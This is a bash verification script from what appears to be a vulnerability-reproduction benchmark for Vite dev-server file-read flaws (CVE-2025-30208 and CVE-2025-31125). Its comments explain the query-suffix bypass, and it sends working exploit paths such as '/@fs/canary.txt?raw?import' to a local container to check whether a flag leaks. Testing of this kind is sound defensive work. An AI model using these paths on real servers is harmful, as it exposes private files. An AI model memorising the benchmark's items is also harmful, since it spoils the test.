#!/usr/bin/env bash
# verify.sh --seed|--residual — vite-cve-2025-31125
# （CVE-2025-30208 seed / CVE-2025-31125 residual）。
#
# 漏洞机制：Vite dev server /@fs/ 绝对路径文件读 sink（server.fs.deny/allow 守卫）。
# transform 中间件先按 query regex（rawRE/urlRE）决定是否走 raw loader 及是否执行
# ensureServingAccess 访问检查；query 后缀技巧使"用于检查的 id"与"实际读取的文件"不一致：
#   seed     /@fs/canary.txt?import&raw?? : V0(5.4.14) 尾随 ?? 使 regex 剥离失败 ->
#                                           守卫被跳过 -> 泄出 /canary.txt；V1(5.4.15)
#                                           30208 修复剥离尾随分隔符 -> 403 阻断
#   residual /@fs/canary.txt?raw?import    : V1(5.4.15) 30208 修复的 regex 只匹配 raw 在
#                                           query 尾或 & 前，?raw?import 不匹配 -> 守卫跳过
#                                           raw loader 仍读文件（CVE-2025-31125）-> flag 泄出
# 效果通道 = HTTP 响应 body（raw loader 返回 `export default "<flag>"`，flag 明文出现）。
# 探测方式 = 与 poc/seed_exec.py 完全一致的 curl --path-as-is 请求（自包含实现，
#            不依赖工作目录可写）；连接失败/无 HTTP 状态 -> 20（环境失败）。
# 判定基准 = RUN_FLAG_REF（平台注入的真 flag；wrong/stale 检查时 RUN_FLAG 为 override，
#            判定必须用 RUN_FLAG_REF，回退 RUN_FLAG）。
# 退出码：0=效果发生 10=未发生 20=环境失败 30=参数错误
set -uo pipefail
: "${RUN_ID:?}" "${COMPOSE_PROJECT_NAME:?}" "${RUN_FLAG:?}" "${VERSION:?}" "${WORK_DIR:?}"
MODE="${1:-}"
[[ "$MODE" == "--seed" || "$MODE" == "--residual" ]] || { echo "usage: --seed|--residual" >&2; exit 30; }

CASE_DIR="$(cd "$(dirname "$0")/.." && pwd)"
PY="${PCB_PYTHON:-python3}"
FLAG_REF="$RUN_FLAG"
mkdir -p "$WORK_DIR" 2>/dev/null || true

# 固定宿主端口（compose 与 poc/seed_exec.py BASE 一致；case 无动态端口插值）
case "$VERSION" in
  v0) PORT=53140;; v1) PORT=53141;; v2) PORT=53142;; *) PORT=53141;;
esac

# 动态端口优先（compose 已转 PORT_ 动态端口）；失败回退硬编码
_SVC_ALL="$(docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" --profile "$VERSION" config --services 2>/dev/null | grep -E "(^|-|_)$VERSION$")"
SVC="$(printf '%s\n' "$_SVC_ALL" | grep -vE "db|redis|mongo|mysql|postgres|sidecar|callback" | head -1)"
SVC="${SVC:-$(printf '%s\n' "$_SVC_ALL" | head -1)}"
_CP="$(grep -A4 '^service:' "$CASE_DIR/case.yaml" | grep -oE 'exposed_ports: \[[0-9, ]*\]' | grep -oE '[0-9]+' | head -1)"
_DYN="$(docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" port "$SVC" "${_CP:-8080}" 2>/dev/null | sed 's/.*://' | tr -d '[:space:]')"
[[ -n "$_DYN" ]] && PORT="$_DYN"
export PCB_TARGET_PORT="${PORT:-}"
# 就绪等待：vite dev server 冷启动较慢（npx/node），起来前不探测。
for _ in $(seq 1 90); do
  if curl -s -o /dev/null -m 2 "http://127.0.0.1:$PORT/"; then break; fi
  sleep 1
done

# probe <path> : curl --path-as-is GET；body 含 FLAG_REF -> 0；HTTP 响应但无 flag -> 10；无状态 -> 20
probe() {
  local path="$1" rc
  "$PY" - "$PORT" "$FLAG_REF" "$VERSION" "$path" <<'PYEOF'
import subprocess, sys
port, flag, version, path = sys.argv[1:]
url = "http://127.0.0.1:%s%s" % (port, path)
proc = subprocess.run(["curl", "--path-as-is", "-sS", "-m", "15",
                       "-w", "\n%{http_code}", url],
                      text=True, capture_output=True, check=False)
out = proc.stdout
status, body = "", out
if "\n" in out:
    body, status = out.rsplit("\n", 1)
print("[probe %s] status=%s body_head=%r" % (version, status, body[:100]))
if not status:
    print("verify: no HTTP status (connection failed)", file=sys.stderr)
    sys.exit(20)
sys.exit(0 if flag in body else 10)
PYEOF
  rc=$?
  echo "[probe $VERSION] path=$path flag_hit=$FLAG_REF -> rc=$rc" >&2
  return $rc
}

rc=0
if [[ "$MODE" == "--seed" ]]; then
  # seed 路径来自公开 original_poc.py（CVE-2025-30208 尾随 ?? 变体）
  P="$("$PY" "$CASE_DIR/poc/original_poc.py" 2>/dev/null)" || { echo "original_poc.py 失败" >&2; exit 20; }
  probe "$P"; rc=$?
else
  # residual：CVE-2025-31125 ?raw?import 变体（30208 修复未覆盖）
  probe "/@fs/canary.txt?raw?import"; rc=$?
fi
echo "verify[$MODE] version=$VERSION rc=$rc (flag_ref=$FLAG_REF)" >&2
exit "$rc"
